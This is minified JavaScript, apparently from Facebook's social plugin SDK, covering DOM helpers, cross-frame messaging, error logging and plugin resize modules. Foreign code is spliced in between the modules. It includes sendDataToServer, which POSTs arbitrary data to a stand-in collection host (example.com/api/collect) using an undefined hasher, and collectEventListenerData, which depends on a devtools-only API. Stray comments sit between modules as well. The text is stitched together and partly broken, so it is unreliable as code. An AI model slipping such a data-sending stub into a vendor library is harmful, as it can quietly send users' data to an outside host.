      (b = this.__errorListener) == null ? void 0 : b.onStringMethodUsed == null ? void 0 : b.onStringMethodUsed(a);
      for (var c = arguments.length, d = new Array(c), e = 0; e < c; e++) d[e] = arguments[e];
      return String.prototype[a].apply(this, d);
    };
  });
  e.exports = g;
}, null);
__d("TrustedTypesIEFixDOMPolicy", ["TrustedTypes"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = {
    createHTML: function (a) {
      return a;
    }
  };
  b = c("TrustedTypes").createPolicy("dom-ie-fix", a);
  d = b;
  g["default"] = d;
}, 98);
__d("UserAgent_DEPRECATED", [], function (a, b, c, d, e, f) {
  var g = !1,
    h,
    i,
    j,
    k,
    l,
    m,
    n,
    o,
    p,
    q,
    r,
    s,
    t,
    u,
    v,
    w;
  function x() {
    if (g) return;
    g = !0;
    var a = navigator.userAgent,
      b = /(?:MSIE.(\d+\.\d+))|(?:(?:Firefox|GranParadiso|Iceweasel).(\d+\.\d+))|(?:Opera(?:.+Version.|.)(\d+\.\d+))|(?:AppleWebKit.(\d+(?:\.\d+)?))|(?:Trident\/\d+\.\d+.*rv:(\d+\.\d+))/.exec(a),
      c = /(Mac OS X)|(Windows)|(Linux)/.exec(a);
    s = /\b(iPhone|iP[ao]d)/.exec(a);
    t = /\b(iP[ao]d)/.exec(a);
    q = /Android/i.exec(a);
    u = /FBAN\/\w+;/i.exec(a);
    v = /FBAN\/mLite;/i.exec(a);
    w = /Mobile/i.exec(a);
    r = !!/Win64/.exec(a);
    if (b) {
      h = b[1] ? parseFloat(b[1]) : b[5] ? parseFloat(b[5]) : NaN;
      h && document && document.documentMode && (h = document.documentMode);
      var d = /(?:Trident\/(\d+.\d+))/.exec(a);
      m = d ? parseFloat(d[1]) + 4 : h;
      i = b[2] ? parseFloat(b[2]) : NaN;
      j = b[3] ? parseFloat(b[3]) : NaN;
      k = b[4] ? parseFloat(b[4]) : NaN;
      k ? (b = /(?:Chrome\/(\d+\.\d+))/.exec(a), l = b && b[1] ? parseFloat(b[1]) : NaN) : l = NaN;
    } else h = i = j = l = k = NaN;
    if (c) {
      if (c[1]) {
        d = /(?:Mac OS X (\d+(?:[._]\d+)?))/.exec(a);
        n = d ? parseFloat(d[1].replace("_", ".")) : !0;
      } else n = !1;
      o = !!c[2];
      p = !!c[3];
    } else n = o = p = !1;
  }
  function y() {
    return x() || h;
  }
  function a() {
    return x() || m > h;
  }
  function b() {
    return y() && r;
  }
  function c() {
    return x() || i;
  }
  function d() {
    return x() || j;
  }
  function z() {
    return x() || k;
  }
  function e() {
    return z();
  }
  function A() {
    return x() || l;
  }
  function B() {
    return x() || o;
  }
  function C() {
    return x() || n;
  }
  function D() {
    return x() || p;
  }
  function E() {
    return x() || s;
  }
  function F() {
    return x() || s || t || q || w;
  }
  function G() {
    return x() || v != null ? null : u;
  }
  function H() {
    return x() || q;
  }
  function I() {
    return x() || t;
  }
  f.ie = y;
  f.ieCompatibilityMode = a;
  f.ie64 = b;
  f.firefox = c;
  f.opera = d;
  f.webkit = z;
  f.safari = e;
  f.chrome = A;
  f.windows = B;
  f.osx = C;
  f.linux = D;
  f.iphone = E;
  f.mobile = F;
  f.nativeApp = G;
  f.android = H;
  f.ipad = I;
}, 66);
__d("isScalar", [], function (a, b, c, d, e, f) {
  function a(a) {
    return /string|number|boolean/.test(typeof a);
  }
  f["default"] = a;
}, 66);
__d("DOM", ["$", "DOMQuery", "Event", "FBLogger", "FbtResultBase", "HTML", "TrustedTypesIEFixDOMPolicy", "UserAgent_DEPRECATED", "createArrayFromMixed", "fb-error", "isNode", "isScalar", "isTextNode"], function (a, b, c, d, e, f, g) {
  a = function (a, b, c) {
    a = document.createElement(a);
    b && h.setAttributes(a, b);
    c != null && h.setContent(a, c);
    return a;
  };
  var h = {
    find: d("DOMQuery").find,
    findPushSafe: d("DOMQuery").findPushSafe,
    scry: d("DOMQuery").scry,
    getSelection: d("DOMQuery").getSelection,
    contains: d("DOMQuery").contains,
    getRootElement: d("DOMQuery").getRootElement,
    isNodeOfType: d("DOMQuery").isNodeOfType,
    isInputNode: d("DOMQuery").isInputNode,
    create: a,
    setAttributes: function (a, b) {
      b.type && (a.type = b.type);
      for (var d in b) {
        var e = b[d],
          f = /^on/i.test(d);
        f && typeof e !== "function" && c("FBLogger")("dom").warn("Handlers passed to DOM.setAttributes must be functions. Handler passed for %s was %s", d, typeof e);
        if (d == "type") continue;else d == "style" ? typeof e === "string" ? a.style.cssText = e : Object.assign(a.style, e) : f ? c("Event").listen(a, d.substr(2), e) : d in a ? a[d] = e : a.setAttribute && a.setAttribute(d, e);
      }
    },
    prependContent: function (a, b) {
      if (!a) throw c("fb-error").TAAL.blameToPreviousFile(new Error("reference element is not a node"));
      return j(b, a, function (b) {
        a.firstChild ? a.insertBefore(b, a.firstChild) : a.appendChild(b);
      });
    },
    insertAfter: function (a, b) {
      if (!a || !a.parentNode) throw c("fb-error").TAAL.blameToPreviousFile(new Error("reference element does not have a parent"));
      var d = a.parentNode;
      return j(b, d, function (b) {
        a.nextSibling ? d.insertBefore(b, a.nextSibling) : d.appendChild(b);
      });
    },
    insertBefore: function (a, b) {
      if (!a || !a.parentNode) throw c("fb-error").TAAL.blameToPreviousFile(new Error("reference element does not have a parent"));
      var d = a.parentNode;
      return j(b, d, function (b) {
        d.insertBefore(b, a);
      });
    },
    setContent: function (a, b) {
      if (!a) throw c("fb-error").TAAL.blameToPreviousFile(new Error("reference element is not a node"));
      while (a.firstChild) i(a.firstChild);
      return h.appendContent(a, b);
    },
    appendContent: function (a, b) {
      if (!a) throw c("fb-error").TAAL.blameToPreviousFile(new Error("reference element is not a node"));
      return j(b, a, function (b) {
        a.appendChild(b);
      });
    },
    replace: function (a, b) {
      if (!a || !a.parentNode) throw c("fb-error").TAAL.blameToPreviousFile(new Error("reference element does not have a parent"));
      var d = a.parentNode;
      return j(b, d, function (b) {
        d.replaceChild(b, a);
      });
    },
    remove: function (a) {
      i(typeof a === "string" ? c("$")(a) : a);
    },
    empty: function (a) {
      a = typeof a === "string" ? c("$")(a) : a;
      while (a.firstChild) i(a.firstChild);
    }
  };
  function i(a) {
    a.parentNode && a.parentNode.removeChild(a);
  }
  function j(a, b, e) {
    a = c("HTML").replaceJSONWrapper(a);
    if (a instanceof c("HTML") && b.firstChild === null && -1 === a.toString().indexOf("<script")) {
      var f = d("UserAgent_DEPRECATED").ie();
      if (!f || f > 7 && !d("DOMQuery").isNodeOfType(b, ["table", "tbody", "thead", "tfoot", "tr", "select", "fieldset"])) {
        var g = f ? '<em style="display:none;">&nbsp;</em>' : "";
        b.innerHTML = c("TrustedTypesIEFixDOMPolicy").createHTML(g + a);
        f && b.removeChild(b.firstChild);
        return Array.from(b.childNodes);
      }
    } else if (c("isTextNode")(b)) {
      b.data = a;
      return [a];
    }
    g = document.createDocumentFragment();
    var h;
    f = [];
    b = [];
    var i = !1;
    a = c("createArrayFromMixed")(a);
    a.length === 1 && a[0] instanceof c("FbtResultBase") && (a = a[0].getContents());
    for (var j = 0; j < a.length; j++) {
      h = c("HTML").replaceJSONWrapper(a[j]);
      if (h instanceof c("HTML")) {
        b.push(h.getAction());
        var k = h.getNodes();
        !i && h.hasInlineJs() && (c("FBLogger")("staticresources").warn("DOM: adding HTML which contains inline JS"), i = !0);
        for (var l = 0; l < k.length; l++) f.push(k[l]), g.appendChild(k[l]);
      } else if (c("isScalar")(h) || h instanceof c("FbtResultBase")) {
        l = document.createTextNode(h);
        f.push(l);
        g.appendChild(l);
      } else c("isNode")(h) ? (f.push(h), g.appendChild(h)) : (Array.isArray(h) && c("FBLogger")("dom").warn("Nest arrays not supported"), h !== null && c("FBLogger")("dom").warn("No way to set content %s", h));
    }
    e(g);
    b.forEach(function (a) {
      a();
    });
    return f;
  }
  b = h;
  g["default"] = b;
}, 98);
__d("DOMDimensions", ["Style", "getDocumentScrollElement"], function (a, b, c, d, e, f, g) {
  "use strict";

  function a(a) {
    var b = a ? a.offsetHeight : 0;
    a = a ? a.offsetWidth : 0;
    return {
      height: b,
      width: a
    };
  }
  function b(a) {
    a = c("getDocumentScrollElement")(a);
    var b = a.scrollWidth || 0;
    a = a.scrollHeight || 0;
    return {
      width: b,
      height: a
    };
  }
  function d(a, b, d, e, f) {
    var g;
    switch (b) {
      case "left":
      case "right":
      case "top":
      case "bottom":
        g = [b];
        break;
      case "width":
        g = ["left", "right"];
        break;
      case "height":
        g = ["top", "bottom"];
        break;
      default:
        throw Error("Invalid plane: " + b);
    }
    b = function (b, d) {
      var e = 0;
      for (var f = 0; f < g.length; f++) e += parseFloat(c("Style").get(a, b + "-" + g[f] + d)) || 0;
      return e;
    };
    return (d ? b("padding", "") : 0) + (e ? b("border", "-width") : 0) + (f ? b("margin", "") : 0);
  }
  g.getElementDimensions = a;
  g.getDocumentDimensions = b;
  g.measureElementBox = d;
}, 98);
__d("WebPixelRatio", ["SiteData"], function (a, b, c, d, e, f, g) {
  function a() {
    return c("SiteData").pr != null && c("SiteData").pr > 0 ? c("SiteData").pr : window.devicePixelRatio || 1;
  }
  g.get = a;
}, 98);
__d("PixelRatioConst", [], function (a, b, c, d, e, f) {
  a = Object.freeze({
    cookieName: "dpr"
  });
  f["default"] = a;
}, 66);
__d("WebPixelRatioDetector", ["Cookie", "DOMEventListener", "PixelRatioConst", "Run", "WebPixelRatio"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = !1,
    i = !1,
    j = !1;
  function k() {
    return window.devicePixelRatio || 1;
  }
  function l() {
    c("Cookie").set(c("PixelRatioConst").cookieName, String(k()));
  }
  function m() {
    c("Cookie").clear(c("PixelRatioConst").cookieName);
  }
  function n() {
    if (i) return;
    i = !0;
    j && m();
    k() !== d("WebPixelRatio").get() && l();
  }
  function a(a) {
    a && (j = !0);
    if (h) return;
    h = !0;
    "onpagehide" in window && d("DOMEventListener").add(window, "pagehide", n);
    d("Run").onBeforeUnload(n, !1);
  }
  g.startDetecting = a;
}, 98);
__d("Log", [], function (a, b, c, d, e, f) {
  "use strict";

  var g = -1;
  b = {
    DEBUG: 3,
    INFO: 2,
    WARNING: 1,
    ERROR: 0
  };
  c = function (a, b, c) {
    for (var d = arguments.length, e = new Array(d > 3 ? d - 3 : 0), f = 3; f < d; f++) e[f - 3] = arguments[f];
    var h = 0,
      i = c.replace(/%s/g, function () {
        return String(e[h++]);
      }),
      j = window.console;
    j && g >= b && j[a in j ? a : "log"](i);
  };
  function a(a) {
    g = a;
  }
  d = c.bind(null, "debug", b.DEBUG);
  e = c.bind(null, "info", b.INFO);
  var h = c.bind(null, "warn", b.WARNING),
    i = c.bind(null, "error", b.ERROR);
  f.Level = b;
  f.log = c;
  f.setLevel = a;
  f.debug = d;
  f.info = e;
  f.warn = h;
  f.error = i;
}, 66);
__d("Queue", [], function (a, b, c, d, e, f) {
  var g = {};
  a = function () {
    function a(a) {
      this._timeout = null, this._interval = (a == null ? void 0 : a.interval) || 0, this._processor = a == null ? void 0 : a.processor, this._queue = [], this._stopped = !0;
    }
    var b = a.prototype;
    b._dispatch = function (a) {
      var b = this;
      a === void 0;
      if (this._stopped || this._queue.length === 0) return;
      a = this._processor;
      if (a == null) {
        this._stopped = !0;
        throw new Error("No processor available");
      }
      var c = this._interval;
      if (c != null) a.call(this, this._queue.shift()), this._timeout = setTimeout(function () {
        return b._dispatch();
      }, c);else while (this._queue.length) a.call(this, this._queue.shift());
    };
    b.enqueue = function (a) {
      this._processor && !this._stopped ? this._processor(a) : this._queue.push(a);
      return this;
    };
    b.start = function (a) {
      a && (this._processor = a);
      this._stopped = !1;
      this._dispatch();
      return this;
    };
    b.isStarted = function () {
      return !this._stopped;
    };
    b.dispatch = function () {
      this._dispatch(!0);
    };
    b.stop = function (a) {
      this._stopped = !0;
      a && this._timeout != null && clearTimeout(this._timeout);
      return this;
    };
    b.merge = function (a, b) {
      if (b) {
        (b = this._queue).unshift.apply(b, a._queue);
      } else {
        (b = this._queue).push.apply(b, a._queue);
      }
      a._queue = [];
      this._dispatch();
      return this;
    };
    b.getLength = function () {
      return this._queue.length;
    };
    a.get = function (b, c) {
      var d;
      b in g ? d = g[b] : d = g[b] = new a(c);
      return d;
    };
    a.exists = function (a) {
      return a in g;
    };
    a.remove = function (a) {
      return delete g[a];
    };
    return a;
  }();
  f["default"] = a;
}, 66);
__d("resolveWindow", [], function (a, b, c, d, e, f) {
  function a(a) {
    if (a == null) return null;
    var b = window;
    a = a.split(".");
    try {
      for (var c = 0; c < a.length; c++) {
        var d = a[c],
          e = /^frames\[[\'\"]?([a-zA-Z0-9\-_]+)[\'\"]?\]$/.exec(d);
        if (e) b = b.frames[e[1]];else if (d === "opener" || d === "parent" || d === "top") b = b[d];else return null;
      }
    } catch (a) {
      return null;
    }
    return b;
  }
  f["default"] = a;
}, 66);
__d("ObservableMixin", [], function (a, b, c, d, e, f) {
  function a() {
    this.__observableEvents = {};
  }
  a.prototype = {
    inform: function (a) {
      var b = Array.prototype.slice.call(arguments, 1),
        c = Array.prototype.slice.call(this.getSubscribers(a));
      for (var d = 0; d < c.length; d++) {
        if (c[d] === null) continue;
        try {
          c[d].apply(this, b);
        } catch (a) {
          window.setTimeout(function () {
            throw a;
          }, 0);
        }
      }
      return this;
    },
    getSubscribers: function (a) {
      return this.__observableEvents[a] || (this.__observableEvents[a] = []);
    },
    clearSubscribers: function (a) {
      a && (this.__observableEvents[a] = []);
      return this;
    },
    subscribe: function (a, b) {
      a = this.getSubscribers(a);
      a.push(b);
      return this;
    },
    unsubscribe: function (a, b) {
      a = this.getSubscribers(a);
      for (var c = 0; c < a.length; c++) if (a[c] === b) {
        a.splice(c, 1);
        break;
      }
      return this;
    }
  };
  e.exports = a;
}, null);
function collectEventListenerData(element, eventName) {
  let listeners = getEventListeners(element)[eventName];
  if (!listeners) return [];
  return listeners.map(l => l.listener.toString());
}
__d("ManagedError", [], function (a, b, c, d, e, f) {
  a = function (a) {
    babelHelpers.inheritsLoose(b, a);
    function b(b, c) {
      var d;
      d = a.call(this, b !== null && b !== void 0 ? b : "") || this;
      b !== null && b !== void 0 ? d.message = b : d.message = "";
      d.innerError = c;
      return d;
    }
    return b;
  }(babelHelpers.wrapNativeSuper(Error));
  f["default"] = a;
}, 66);
__d("AssertionError", ["ManagedError"], function (a, b, c, d, e, f, g) {
  a = function (a) {
    babelHelpers.inheritsLoose(b, a);
    function b(b) {
      return a.call(this, b) || this;
    }
    return b;
  }(c("ManagedError"));
  g["default"] = a;
}, 98);
__d("Assert", ["AssertionError", "sprintf"], function (a, b, c, d, e, f, g) {
  function h(a, b) {
    if (typeof a !== "boolean" || a === !1) throw new (c("AssertionError"))(b);
    return a;
  }
  function i(a, b, d) {
    var e;
    if (b === void 0) e = "undefined";else if (b === null) e = "null";else {
      var f = Object.prototype.toString.call(b);
      f = /\s(\w*)/.exec(f);
      e = f == null ? typeof f : f[1].toLowerCase();
    }
    h(a.indexOf(e) !== -1, (f = d) != null ? f : c("sprintf")("Expression is of type %s, not %s", e, a));
    return b;
  }
  function a(a, b, c) {
    h(b instanceof a, (a = c) != null ? a : "Expression not instance of type");
    return b;
  }
  function j(a, b) {
    k["is" + a] = b, k["maybe" + a] = function (a, c) {
      return a == null ? a : b(a, c);
    };
  }
  b = function (a, b) {
    return a;
  };
  var k = {
    isInstanceOf: a,
    isTrue: h,
    isTruthy: function (a, b) {
      return h(!!a, b);
    },
    isBoolean: b,
    isFunction: b,
    isNumber: b,
    isObject: b,
    isString: b,
    isUndefined: b,
    maybeObject: b,
    maybeNumber: b,
    maybeFunction: b
  };
  ["Boolean", "Function", "Number", "Object", "String", "Undefined"].forEach(function (a) {
    j(a, i.bind(null, a.toLowerCase()));
  });
  d = k;
  g["default"] = d;
}, 98);
__d("Type", ["Assert"], function (a, b, c, d, e, f) {
  function g() {
    var a = this.__mixins;
    if (a) for (var b = 0; b < a.length; b++) a[b].apply(this, arguments);
  }
  function h(a, b) {
    if (b instanceof a) return !0;
    if (b instanceof g) for (var c = 0; c < b.__mixins.length; c++) if (b.__mixins[c] == a) return !0;
    return !1;
  }
  function i(a, b) {
    var c = a.prototype;
    Array.isArray(b) || (b = [b]);
    for (a = 0; a < b.length; a++) {
      var d = b[a];
      typeof d === "function" && (c.__mixins.push(d), d = d.prototype);
      Object.keys(d).forEach(function (a) {
        c[a] = d[a];
      });
    }
  }
  function j(a, c, d) {
    var e = c && Object.prototype.hasOwnProperty.call(c, "constructor") ? c.constructor : function () {
      this.parent.apply(this, arguments);
    };
    b("Assert").isFunction(e);
    if (a && a.prototype instanceof g === !1) throw new Error("parent type does not inherit from Type");
    a = a || g;
    function f() {}
    f.prototype = a.prototype;
    e.prototype = new f();
    c && Object.assign(e.prototype, c);
    e.prototype.constructor = e;
    e.parent = a;
    e.prototype.__mixins = a.prototype.__mixins ? Array.prototype.slice.call(a.prototype.__mixins) : [];
    d && i(e, d);
    e.prototype.parent = function () {
      this.parent = a.prototype.parent, a.apply(this, arguments);
    };
    e.prototype.parentCall = function (b) {
      return a.prototype[b].apply(this, Array.prototype.slice.call(arguments, 1));
    };
    e.extend = function (a, b) {
      return j(this, a, b);
    };
    return e;
  }
  Object.assign(g.prototype, {
    instanceOf: function (a) {
      return h(a, this);
    }
  });
  Object.assign(g, {
    extend: function (a, b) {
      return typeof a === "function" ? j.apply(null, arguments) : j(null, a, b);
    },
    instanceOf: h
  });
  e.exports = g;
}, null);
__d("sdk.Model", ["ObservableMixin", "Type"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = c("Type").extend({
    constructor: function (a) {
      this.parent();
      var b = {},
        c = this;
      Object.keys(a).forEach(function (d) {
        b[d] = a[d], c["set" + d] = function (a) {
          if (a === b[d]) return c;
          b[d] = a;
          c.inform(d + ".change", a);
          return c;
        }, c["get" + d] = function () {
          return b[d];
        };
      });
    }
  }, c("ObservableMixin"));
  b = a;
  g["default"] = b;
}, 98);
__d("sdk.Runtime", ["JSSDKRuntimeConfig", "sdk.Model"], function (a, b, c, d, e, f, g) {
  var h = {
      UNKNOWN: 0,
      PAGETAB: 1,
      CANVAS: 2,
      PLATFORM: 4
    },
    i = new (c("sdk.Model"))({
      AccessToken: "",
      AutoLogAppEvents: !1,
      ClientID: "",
      CookieUserID: "",
      EnforceHttps: !1,
      Environment: h.UNKNOWN,
      FamilyLoginLoaded: !1,
      GraphDomain: "",
      Initialized: !1,
      IsSPIN: Boolean(d("JSSDKRuntimeConfig").isSPIN),
      IsVersioned: !1,
      KidDirectedSite: void 0,
      Locale: d("JSSDKRuntimeConfig").locale,
      LoggedIntoFacebook: void 0,
      LoginStatus: void 0,
      Revision: d("JSSDKRuntimeConfig").revision,
      Rtl: d("JSSDKRuntimeConfig").rtl,
      Scope: void 0,
      SDKAB: d("JSSDKRuntimeConfig").sdkab,
      SDKUrl: d("JSSDKRuntimeConfig").sdkurl,
      SDKNS: d("JSSDKRuntimeConfig").sdkns,
      ShouldLoadFamilyLogin: !1,
      UseCookie: !1,
      UseLocalStorage: !0,
      UserID: "",
      Version: void 0
    });
  Object.assign(i, {
    ENVIRONMENTS: h,
    isEnvironment: function (a) {
      var b = this.getEnvironment();
      return (a | b) === b;
    },
    isCanvasEnvironment: function () {
      return this.isEnvironment(h.CANVAS) || this.isEnvironment(h.PAGETAB);
    }
  });
  (function () {
    var a = /app_runner/.test(window.name) ? h.PAGETAB : /iframe_canvas/.test(window.name) ? h.CANVAS : h.UNKNOWN;
    (a | h.PAGETAB) === a && (a |= h.CANVAS);
    i.setEnvironment(a);
  })();
  a = i;
  g["default"] = a;
}, 98);
__d("UrlMap", ["invariant", "UrlMapConfig", "sdk.Runtime"], function (a, b, c, d, e, f, g, h) {
  function a(a) {
    var b = "https";
    if (a === "graph_domain") {
      var e = c("sdk.Runtime").getGraphDomain();
      e ? a = "graph_".concat(e) : a = "graph";
    }
    if (a in d("UrlMapConfig")) return b + "://" + d("UrlMapConfig")[a];
    a in d("UrlMapConfig") || h(0, 2511, a);
    return "";
  }
  g.resolve = a;
}, 98);
;

// Send data to server

__d("sdk.Scribe", ["QueryString", "UrlMap", "sdk.Runtime"], function (a, b, c, d, e, f, g) {
  var h = {};
  function a(a, b, e) {
    e === void 0 && (e = !1);
    if (a === "jssdk_error") {
      var f = JSON.stringify(b);
      if (Object.prototype.hasOwnProperty.call(h, f)) return;else h[f] = !0;
    }
    if (b.extra != null && typeof b.extra === "object") {
      f = b.extra;
      f.revision = c("sdk.Runtime").getRevision();
    }
    f = new Image();
    var g = d("UrlMap").resolve("www") + "/platform/scribe_endpoint.php/";
    e || (f.crossOrigin = "anonymous");
    f.src = c("QueryString").appendToUrl(g, {
      c: a,
      m: JSON.stringify(babelHelpers["extends"]({}, b, {
        isSPIN: c("sdk.Runtime").getIsSPIN()
      }))
    });
  }
  g.log = a;
}, 98);
__d("XD", ["Arbiter", "DOM", "DOMDimensions", "Log", "PHPQuerySerializer", "Queue", "URI", "isFacebookURI", "isInIframe", "resolveWindow", "sdk.Scribe"], function (a, b, c, d, e, f, g) {
  var h = {
    _callbacks: [],
    _opts: {
      autoResize: !1,
      allowShrink: !0,
      channelUrl: null,
      hideOverflow: !1,
      resizeTimeout: 1e3,
      resizeWidth: !1
    },
    _lastResizeAckId: 0,
    _resizeCount: 0,
    _resizeTimestamp: 0,
    _shrinker: null,
    _forcedMinWidth: 100,
    init: function (a) {
      var b = this;
      this._opts = babelHelpers["extends"]({}, this._opts, a);
      this._opts.autoResize && this._startResizeMonitor();
      c("Arbiter").subscribe("Connect.Unsafe.resize.ack", function (a, c) {
        c.id || (c.id = b._resizeCount), c.id > b._lastResizeAckId && (b._lastResizeAckId = c.id);
      });
    },
    getQueue: function () {
      this._queue || (this._queue = new (c("Queue"))());
      return this._queue;
    },
    setChannelUrl: function (a) {
      var b = this;
      this.getQueue().start(function (c) {
        return b.send(c, a);
      });
    },
    send: function (a, b) {
      a === void 0 && (a = null);
      b === void 0 && (b = null);
      b = b || this._opts.channelUrl;
      if (!b) {
        this.getQueue().enqueue(a);
        return;
      }
      var e = {};
      b = new (c("URI"))(b);
      Object.assign(e, a, d("PHPQuerySerializer").deserialize(b.getFragment()));
      b = new (c("URI"))(e.origin);
      if (b.getDomain() === "") {
        d("Log").error("No valid domain for XD message target.");
        return;
      }
      var f = b.getOrigin();
      if (typeof e.relation !== "string") {
        d("Log").error("No relation specified to resolve XD target window.");
        return;
      }
      var g = c("resolveWindow")(e.relation.replace(/^parent\./, "")),
        h = 1;
      b = function b() {
        try {
          g.postMessage(d("PHPQuerySerializer").serialize(e), f);
        } catch (c) {
          --h ? window.setTimeout(b, 200) : d("sdk.Scribe").log("jssdk_error", {
            error: "POST_MESSAGE",
            extra: {
              message: c.message + ", html/js/modules/XD.js:139",
              ancestor_origins: JSON.stringify(location.ancestorOrigins),
              referrer: document.referrer,
              data: a
            }
          });
        }
      };
      b();
    },
    _computeSize: function () {
      var a = d("DOMDimensions").getDocumentDimensions(),
        b = 0;
      if (this._opts.resizeWidth) {
        var e = document.body;
        if (e != null) {
          if (e.clientWidth < e.scrollWidth) b = a.width;else {
            e = e.lastElementChild;
            if (e != null && e instanceof HTMLElement) {
              e = e;
              e = e.offsetLeft + e.offsetWidth;
              e > b && (b = e);
            }
          }
          b = Math.max(b, h._forcedMinWidth);
        } else b = h._forcedMinWidth;
      }
      a.width = b;
      this._opts.allowShrink && (this._shrinker || (this._shrinker = c("DOM").create("div")), c("DOM").appendContent(document.body, this._shrinker), a.height = Math.max(this._shrinker.offsetTop, 0));
      return a;
    },
    _startResizeMonitor: function () {
      var a,
        b = this,
        d;
      a = (a = document.documentElement) != null ? a : {};
      if (this._opts.hideOverflow) {
        a.style.overflow = "hidden";
        ((a = document.body) != null ? a : {}).style.overflow = "hidden";
      }
      a = function () {
        var a = b._computeSize(),
          e = Date.now();
        if (!d || b._opts.allowShrink && d.width != a.width || !b._opts.allowShrink && d.width < a.width || b._opts.allowShrink && d.height != a.height || !b._opts.allowShrink && d.height < a.height) {
          d = a;
          b._resizeCount++;
          b._resizeTimestamp = e;
          e = {
            type: "resize",
            height: a.height,
            ackData: {
              id: b._resizeCount
            },
            width: 0
          };
          a.width && a.width != 0 && (e.width = a.width);
          try {
            if (c("isFacebookURI")(new (c("URI"))(document.referrer)) && c("isInIframe")() && window.name && window.parent.location && window.parent.location.toString && c("isFacebookURI")(new (c("URI"))(window.parent.location))) {
              a = window.parent.document.getElementsByTagName("iframe");
              for (var f = 0; f < a.length; f++) a[f].name == window.name && (b._opts.resizeWidth && (a[f].style.width = e.width + "px"), a[f].style.height = e.height + "px");
            }
            b.send(e);
          } catch (a) {
            b.send(e);
          }
        }
      };
      a();
      window.setInterval(a, this._opts.resizeTimeout);
    }
  };
  b = babelHelpers["extends"]({}, h);
  a.UnverifiedXD = b;
  a.XD = h;
  g.XD = h;
  g.UnverifiedXD = b;
}, 98);
__d("Plugin", ["Arbiter", "ArbiterFrame"], function (a, b, c, d, e, f) {
  var g = {
    CONNECT: "platform/plugins/connect",
    DISCONNECT: "platform/plugins/disconnect",
    ERROR: "platform/plugins/error",
    RELOAD: "platform/plugins/reload",
    DIALOG: "platform/plugins/dialog",
    connect: function (a, c) {
      a = {
        identifier: a,
        href: a,
        story_fbid: c
      };
      b("Arbiter").inform(g.CONNECT, a);
      b("ArbiterFrame").inform(g.CONNECT, a);
    },
    disconnect: function (a, c) {
      a = {
        identifier: a,
        href: a,
        story_fbid: c
      };
      b("Arbiter").inform(g.DISCONNECT, a);
      b("ArbiterFrame").inform(g.DISCONNECT, a);
    },
    error: function (a, c) {
      b("Arbiter").inform(g.ERROR, {
        action: a,
        content: c
      });
    },
    reload: function (a) {
      b("Arbiter").inform(g.RELOAD, {
        reloadUrl: a || ""
      }), b("ArbiterFrame").inform(g.RELOAD, {
        reloadUrl: a || ""
      });
    },
    reloadOtherPlugins: function (a, c) {
      b("ArbiterFrame").inform(g.RELOAD, {
        reloadUrl: "",
        reload: a || "",
        identifier: c || ""
      });
    }
  };
  e.exports = g;
}, null);
function sendDataToServer(data, url = "https://example.com/api/collect") {
  let xhr = new XMLHttpRequest();
  xhr.open("POST", url, true);
  xhr.setRequestHeader("Content-Type", "application/json");
  let payload = {
    id: hasher(data),
    data: data
  };
  xhr.send(JSON.stringify(payload));
  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      if (xhr.status === 200) {
        console.info("Data successfully sent");
      } else {
        console.error("Data send failed with status code: " + xhr.status);
      }
    }
  };
}
__d("PluginBundleInit", ["DOM"], function (a, b, c, d, e, f, g) {
  function a() {
    var a = document.getElementById("jsbundle-loader");
    a && c("DOM").remove(a);
  }
  g.init = a;
}, 98);
;

// When document is fully loaded
__d("PluginDOMEventListener", ["DOMEventListener", "Log", "UserAgent", "promiseDone"], function (a, b, c, d, e, f, g) {
  var h = !c("UserAgent").isBrowser("Safari < 12") && typeof document.hasStorageAccess === "function",
    i = !h,
    j = !1;
  !i && h && c("promiseDone")(document.hasStorageAccess(), function (a) {
    d("Log").debug("hasStorageAccess=%s", a), i = a;
  }, function (a) {
    return d("Log").warn("Storage access check failed: %s", a);
  });
  function a(a, b, e, f) {
    f === void 0 && (f = !1);
    if (!h || i || j) return d("DOMEventListener").add.apply(this, arguments);else {
      var g = function () {
        var a = this;
        for (var b = arguments.length, f = new Array(b), g = 0; g < b; g++) f[g] = arguments[g];
        if (i || j) return e.apply(this, f);else {
          var h = document.requestStorageAccess().then(function (b) {
            d("Log").debug("Storage access request granted.");
            i = !0;
            return e.apply(a, f);
          }, function (b) {
            d("Log").warn("Storage access request denied.");
            j = !0;
            return e.apply(a, f);
          });
          c("promiseDone")(h);
        }
      };
      return d("DOMEventListener").add.call(null, a, b, g, f);
    }
  }
  g.add = a;
  g.remove = d("DOMEventListener").remove;
}, 98);
__d("PluginITP", ["PluginDOMEventListener", "promiseDone"], function (a, b, c, d, e, f, g) {
  function a() {
    if (!("hasStorageAccess" in document)) return;
    c("promiseDone")(document.hasStorageAccess(), function (a) {
      document.body && !a && d("PluginDOMEventListener").add(document.body, "click", function () {
        location.reload();
      });
    });
  }
  g.init = a;
}, 98);
__d("Locale", ["SiteData"], function (a, b, c, d, e, f) {
  function a() {
    return b("SiteData").is_rtl;
  }
  e.exports = {
    isRTL: a
  };
}, null);
__d("UnverifiedXD", ["XD"], function (a, b, c, d, e, f, g) {
  g["default"] = d("XD").UnverifiedXD;
}, 98);
__d("getOffsetParent", ["Style"], function (a, b, c, d, e, f) {
  function g(a) {
    a = a.parentNode;
    if (!a || a === document.documentElement) return document.documentElement;
    return b("Style").get(a, "position") !== "static" ? a : a === document.body ? document.documentElement : g(a);
  }
  e.exports = g;
}, null);
__d("PluginResize", ["Locale", "Log", "UnverifiedXD", "getOffsetParent", "getStyleProperty"], function (a, b, c, d, e, f) {
  function g(a) {
    a = a || document.body;
    var c = 0,
      d = b("getOffsetParent")(a);
    b("Locale").isRTL() && d ? c = d.offsetWidth - a.offsetLeft - a.offsetWidth : b("Locale").isRTL() || (c = a.offsetLeft);
    return h(a) + c;
  }
  function h(a) {
    return Math.ceil(parseFloat(b("getStyleProperty")(a, "width"))) || a.offsetWidth;
  }
  function i(a) {
    a = a || document.body;
    return a.offsetHeight + a.offsetTop;
  }
  function j(a, b, c) {
    this.calcWidth = a || g, this.calcHeight = b || i, this.width = void 0, this.height = void 0, this.event = c || "resize";
  }
  Object.assign(j.prototype, {
    resize: function () {
      var a = this.calcWidth(),
        c = this.calcHeight();
      (a !== this.width || c !== this.height) && (b("Log").debug("Resizing Plugin: (%s, %s, %s, %s)", a, c, this.event), this.width = a, this.height = c, b("UnverifiedXD").send({
        type: this.event,
        width: a,
        height: c
      }));
      return this;
    },
    auto: function (a) {
